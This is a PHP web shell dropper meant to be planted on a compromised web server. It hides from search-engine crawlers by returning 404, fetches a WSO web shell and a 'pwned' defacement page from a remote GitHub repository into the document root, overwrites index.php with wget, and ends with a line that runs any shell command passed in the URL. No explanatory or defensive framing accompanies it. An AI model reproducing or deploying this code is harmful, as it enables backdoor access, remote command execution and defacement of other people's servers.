<?php
error_reporting(0);
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
?>
<body bgcolor="black">
<?php $source = "https://raw.githubusercontent.com/rizki1337/shell/main/wso1337.php"; $name = "wso1337.php"; function _summon($name, $file) { $filename = $name; $fget = file_get_contents($file); $path=$_SERVER['DOCUMENT_ROOT'].DIRECTORY_SEPARATOR; $fileopen=fopen("$path/$filename",'w'); $execfile=fwrite($fileopen,$fget); $shellurl = $_SERVER['HTTPS'] ? "https" : "http" . "://$_SERVER[HTTP_HOST]"."/$filename"; if($execfile) { if(file_exists($path."/$filename")) { echo "<font color=\"#00FF00\">[OK!] <a href=\"$shellurl\" target=\"_blank\">$shellurl</a></font>"; } else { echo "<font color=\"red\">$path$filename<br>Doesn't exist!</font>"; } } else { echo "<font color=\"red\">Failed get newfile $filename in $path</font>"; } } _summon($name, $source); ?>
<br>
<?php $source1 = "https://raw.githubusercontent.com/rizki1337/shell/main/pwned.html"; $name1 = "pwned.html"; function _summon1($name1, $file1) { $filename1 = $name1; $fget1 = file_get_contents($file1); $path1=$_SERVER['DOCUMENT_ROOT'].DIRECTORY_SEPARATOR; $fileopen1=fopen("$path1/$filename1",'w'); $execfile1=fwrite($fileopen1,$fget1); $shellurl1 = $_SERVER['HTTPS'] ? "https" : "http" . "://$_SERVER[HTTP_HOST]"."/$filename1"; if($execfile1) { if(file_exists($path1."/$filename1")) { echo "<font color=\"#00FF00\">[OK!] <a href=\"$shellurl1\" target=\"_blank\">$shellurl1</a></font>"; } else { echo "<font color=\"red\">$path1$filename1<br>Doesn't exist!</font>"; } } else { echo "<font color=\"red\">Failed get newfile $filename1 in $path1</font>"; } } _summon($name1, $source1); ?>
<?php
system("wget https://raw.githubusercontent.com/rizki1337/shell/main/index.php -O index.php")
?>
<br>
<br>
<font color=\"#00FF00\">
<?php system($_GET[cmd]); ?>